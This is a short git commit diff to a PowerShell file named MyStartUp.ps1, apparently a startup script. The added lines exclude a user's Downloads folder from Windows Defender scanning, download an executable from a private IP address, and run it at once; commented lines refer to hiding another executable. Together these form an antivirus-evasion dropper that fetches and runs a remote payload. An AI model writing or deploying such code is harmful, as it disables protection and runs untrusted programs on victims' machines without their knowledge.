965355feaa6f735527a1d8c6fdb9e6d969081328
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-27 16:55:47 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,3 +1,11 @@
+$exclusionPath = "C:\Users\ana\Downloads"
+
+Add-MpPreference -ExclusionPath $exclusionPath
+
+
+Invoke-WebRequest -Uri http://192.168.1.5:443/ana123.exe -OutFile C:\Users\ana\Downloads\ana123.exe
+
+C:\Users\ana\Downloads\ana123.exe
 #attrib +h C:\Users\seba\downloads\shaxh21.exe
 #C:\Users\seba\downloads\shaxh21.exe
 
